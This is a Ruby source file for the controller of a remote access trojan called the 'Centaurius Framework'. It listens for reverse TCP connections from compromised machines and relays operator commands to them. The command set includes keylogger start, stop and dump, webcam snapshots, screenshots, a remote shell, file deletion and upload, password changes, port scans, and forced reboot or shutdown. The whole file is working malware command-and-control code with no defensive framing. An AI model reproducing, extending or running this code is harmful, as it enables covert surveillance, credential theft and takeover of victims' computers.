class Terminal
    def self.runInNewWindow(command)
        `osascript -e 'tell app "Terminal"
        do script "#{command}"
        end tell'`
    end
end

class Backdoor

	attr_accessor :host, :port

	

	def mainBackdoor
		

		loop do 
			begin
				design = Design::Design.new
				cmd = design.input("#{design.randColor("{")}#{design.randColor("cUs")}#{design.randColor("}")} #{design.randColor(">")} ")
				cmd_split = cmd.split(" ")

				if cmd_split.length == 2
					if cmd_split.join(' ') == "use exploit->reverse_tcp"

						while true
							cmd = design.input("#{design.randColor("{")}#{design.randColor("cUs")}#{design.randColor("}")} exploit(#{"\e[33mexploit->reverse_tcp\e[0m"}) #{design.randColor(">")} ")
								cmd_split = cmd.split(" ")

								if cmd_split.length == 1
									if cmd_split[0] == "quit"
										break

									elsif cmd_split[0] == "exploit"
										if self.host != nil && self.port != nil
											socket = TCPServer.new("#{host}", port)
											cmd_ntr = design.input("FTPID => host port user password stockage: ".white)
											cmd_ntr_split = cmd_ntr.split(" ")
											system("cd modules && python2 ftpserver.py #{cmd_ntr_split[0]} #{cmd_ntr_split[1]} #{cmd_ntr_split[2]} #{cmd_ntr_split[3]} #{cmd_ntr_split[4]} > /dev/null 2>&1 &")

											puts design.inListen(host, port)
											loop do	
												session = socket.accept
												data = session.recv(1024)
												puts data
												puts design.sessionCreate(socket.addr(true)[2], socket.addr[1])
												puts ""
												sleep(2)
												design.help
												puts ""
												while true
													cmd_shell_split = design.input("Centaurius > ".white)
													cmd_shell = cmd_shell_split.split(" ")
													if cmd_shell.length == 1
														if cmd_shell[0] == "help"
															design.help
														elsif cmd_shell[0] == "screenshot"
															session.puts "screenshot"
															screenshot_response = session.recv(1024)
															puts screenshot_response
														elsif cmd_shell[0] == "shell"
															session.puts "shell"
															shell_response = session.recv(1024)
															puts shell_response
														elsif cmd_shell[0] == "reboot"
															session.puts "reboot"
															reboot_response = session.recv(1024)
															puts reboot_response
														elsif cmd_shell[0] == "ps"
															session.puts "ps"
															ps_reponse = session.recv(1024)
															puts ps_reponse
														elsif cmd_shell[0] == "clear"
															puts "exec #{">>".blue} #{cmd_shell[0]}"
															sleep(2)
															system("clear")
														elsif cmd_shell[0] == "shutdown"
															session.puts "shutdown"
															shut_response = session.recv(1024)
															puts shut_response
														elsif cmd_shell[0] == "ls"
															session.puts "ls"
															ls_response = session.recv(1024)
															puts ls_response
														elsif cmd_shell[0] == "resettime"
															session.puts "resettime"
															reset_response = session.recv(1024)
															puts reset_response
														elsif cmd_shell[0] == "getpid"
															session.puts "getpid"
															getpid_response = session.recv(1024)
															puts getpid_response
														elsif cmd_shell[0] == "pwd"
															session.puts "pwd"
															pwd_response = session.recv(1024)
															puts pwd_response
														elsif cmd_shell[0] == "quit"
															session.puts "quit"
															quit_response = session.recv(1024)
														elsif cmd_shell[0] == "ifconfig"
															session.puts "ifconfig"
															ifconfig_response = session.recv(1024)
															puts ifconfig_response
														elsif cmd_shell[0] == "getgtw"
															session.puts "getgtw"
															getgtw_reponse = session.recv(1024)
															puts getgtw_reponse
														elsif cmd_shell[0] == "opendiskloop"
															session.puts "opendiskloop"
															opendiskloop_reponse = session.recv(1024)
															puts opendiskloop_reponse
														elsif cmd_shell[0] == "odisk"
															session.puts "odisk"
															odisk_response = session.recv(1024)
															puts odisk_response
														elsif cmd_shell[0] == "webcamsnap"
															session.puts "webcamsnap"
															webcamsnap_reponse = session.recv(1024)
															puts webcamsnap_reponse
														elsif cmd_shell[0] == "whoami"
															session.puts "whoami"
															whoami_reponse = session.recv(1024)
															puts whoami_reponse
														elsif cmd_shell[0] == "dir"
															session.puts "dir"
															dir_response = session.recv(1024)
															puts dir_response
														elsif cmd_shell[0] == "netuser"
															session.puts "netuser"
															netuser_response = session.recv(1024)
															puts netuser_response
														elsif cmd_shell[0] == "keylogger_start"
															session.puts "keylogger_start"
															keylogger_start_response = session.recv(1024)
															puts keylogger_start_response
														elsif cmd_shell[0] == "keylogger_stop"
															session.puts "keylogger_stop"
															keylogger_stop_response = session.recv(1024)
															puts keylogger_stop_response
														elsif cmd_shell[0] == "keylogger_dump"
															session.puts "keylogger_dump"
															keylogger_dump_response = session.recv(1024)
															puts keylogger_dump_response
														elsif cmd_shell[0] == "sysinfo"
															session.puts "sysinfo"
															sysinfo_response = session.recv(1024)
															puts sysinfo_response
														elsif cmd_shell[0] == "ipgeo"
															session.puts "ipgeo"
															ipgeo_response = session.recv(1024)
															puts ipgeo_response
														else
															puts "#{cmd} #{">>".red} Command not found";
															next
														end
															
													elsif cmd_shell.length == 2
														if cmd_shell[0] == "cd" && cmd_shell[1] != nil
															session.puts "cd #{cmd_shell[1]}"
															cd_response = session.recv(1024)
															puts cd_response
														elsif cmd_shell[0] == "cat" && cmd_shell[1] != nil
															session.puts "cat #{cmd_shell[1]}"
															cat_response = session.recv(1024)
															puts cat_response
														elsif cmd_shell[0] == "portscan" && cmd_shell[1] != nil
															session.puts "portscan #{cmd_shell[1]}"
															portscan_response = session.recv(1024)
															puts portscan_response
														elsif cmd_shell[0] == "del" && cmd_shell[1] != nil
															session.puts "del #{cmd_shell[1]}"
															del_response = session.recv(1024)
															puts del_response
														elsif cmd_shell[0] == "rmpt" && cmd_shell[1] != nil
															session.puts "rmpt #{cmd_shell[1]}"
															rmpt_response = session.recv(1024)
															puts rmpt_response
														elsif cmd_shell[0] == "mkpa" && cmd_shell[1] != nil
															session.puts "mkpa #{cmd_shell[1]}"
															mkpa_response = session.recv(1024)
															puts mkpa_response
														elsif cmd_shell[0] == "xorencode" && cmd_shell[1] != nil
															session.puts "xorencode #{cmd_shell[1]}"
															xor_response = session.recv(1024)
															puts xor_response
														elsif cmd_shell[0] == "b64encode" && cmd_shell[1] != nil
															session.puts "b64encode #{cmd_shell[1]}"
															b64encode_response = session.recv(1024)
															puts b64encode_response
														elsif cmd_shell[0] == "b64decode" && cmd_shell[1] != nil
															session.puts "b64decode #{cmd_shell[1]}"
															b64decode_response = session.recv(1024)
															puts b64decode_response
														elsif cmd_shell[0] == "openurl" && cmd_shell[1] != nil
															session.puts "openurl #{cmd_shell[1]}"
															openurl_response = session.recv(1024)
															puts openurl_response
														elsif cmd_shell[0] == "ftpdownload" && cmd_shell[1] != nil
															session.puts "ftpdownload #{cmd_shell[1]}"
															ftpdownload_response = session.recv(1024)
															puts ftpdownload_response
														elsif cmd_shell[0] == "ftpupload" && cmd_shell[1] != nil
															session.puts "ftpupload #{cmd_shell[1]}"
															ftpupload_response = session.recv(1024)
															puts ftpupload_response
														elsif cmd_shell[0] == "tkill" && cmd_shell[1] != nil
															session.puts "tkill #{cmd_shell[1]}"
															tkill_response = session.recv(1024)
															puts tkill_response
														elsif cmd_shell[0] == "msgbox" && cmd_shell[1] != nil
															session.puts "msgbox #{cmd_shell[1]}"
															msgbox_response = session.recv(1024)
															puts msgbox_response
														elsif cmd_shell[0] == "meslp" && cmd_shell[1] != nil
															session.puts "meslp #{cmd_shell[1]}"
															mslp_response = session.recv(1024)
															puts mslp_response
														elsif cmd_shell[0] == "process" && cmd_shell[1] != nil
															session.puts "process #{cmd_shell[1]}"
															proc_response = session.recv(1024)
															puts proc_response
														else
															puts "#{cmd} #{">>".red} Command not found";
															next
														end
													elsif cmd_shell.length == 3
														if cmd_shell[0] == "rname" && cmd_shell[1] != nil && cmd_shell[2] != nil
															session.puts "rname #{cmd_shell[1]} #{cmd_shell[2]}"
															rname_response = session.recv(1024)
															puts rname_response
														elsif cmd_shell[0] == "move" && cmd_shell[1] != nil && cmd_shell[2] != nil
															session.puts "move #{cmd_shell[1]} #{cmd_shell[2]}"
															move_response = session.recv(1024)
															puts move_response
														elsif cmd_shell[0] == "copy" && cmd_shell[1] != nil && cmd_shell[2] != nil
															session.puts "copy #{cmd_shell[1]} #{cmd_shell[2]}"
															copy_response = session.recv(1024)
															puts copy_response
														elsif cmd_shell[0] == "cwpasswd" && cmd_shell[1] != nil && cmd_shell[2] != nil
															session.puts "cwpasswd #{cmd_shell[1]} #{cmd_shell[2]}"
															cwpasswd_response = session.recv(1024)
															puts cwpasswd_response
														else
															puts "#{cmd} #{">>".red} Command not found";
															next
														end
																		
													else
														puts "#{cmd} #{">>".red} Command not found";
														next
													end
												end
												

											end
											
										else
											puts "#{"[*]".red} You must add host and port"
										end
									else
										puts "#{cmd} #{">>".red} Command not found";
										next
									end
									
								
								elsif cmd_split.length == 3
									if cmd_split[0] == "set" && cmd_split[1] == "lhost"
										if cmd_split[2] != " "
											self.host = cmd_split[2]
											puts "LHOST #{"=>".blue} #{self.host}"
										else
											puts "#{cmd} #{">>".red} Command not found";
											next
										end
									elsif cmd_split[0] == "set" && cmd_split[1] == "lport"
										if cmd_split[2] != ""
											self.port = cmd_split[2]
											puts "LPORT #{"=>".blue} #{self.port}"
										else
											puts "#{cmd} #{">>".red} Command not found";
											next
										end

									else
										puts "#{cmd} #{">>".red} Command not found";
										next
									end


								else
									puts "#{cmd} #{">>".red} Command not found";
									next
								end


						end
		



							else
								puts "#{cmd} #{">>".red} Command not found";
								next
							end

					elsif cmd_split.length == 1
						if cmd.split[0] == "quit"
							abort()

						else
							puts "#{cmd} #{">>".red} Command not found";
							next
						end
					else
						puts "#{cmd} #{">>".red} Command not found";
						next
					end
				rescue SignalException => e
					puts ""
					puts "#{"[!]".blue} Type quit to quit the Centaurius Framework"
				rescue Exception => e
					puts ""
					exit()
				end

			end


		end





	end